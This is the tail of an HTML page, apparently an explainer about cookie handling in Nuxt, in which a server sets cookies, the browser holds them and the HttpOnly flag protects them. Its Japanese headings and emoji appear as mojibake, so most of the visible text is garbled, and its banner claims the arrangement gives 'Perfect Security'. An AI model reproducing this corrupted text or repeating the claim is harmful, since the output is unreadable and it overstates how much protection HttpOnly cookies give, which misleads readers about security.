                <strong>è¨­å®šè€…ãƒ»ä¿æœ‰è€…ãƒ»ã‚¢ã‚¯ã‚»ã‚¹æ¨©ã®å®Œå…¨ç†è§£</strong><br>
                <strong>ä¸–ç•Œæœ€é«˜æ°´æº–ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£</strong>
            </p>
            <div style="margin-top: 20px; font-size: 0.9em; opacity: 0.9;">
                ğŸš€ Nuxt Server (Setter) + ğŸŒ Browser (Holder) + ğŸ”’ HttpOnly (Protector) = ğŸ›¡ï¸ Perfect Security
            </div>
        </div>
    </div>
</body>
</html>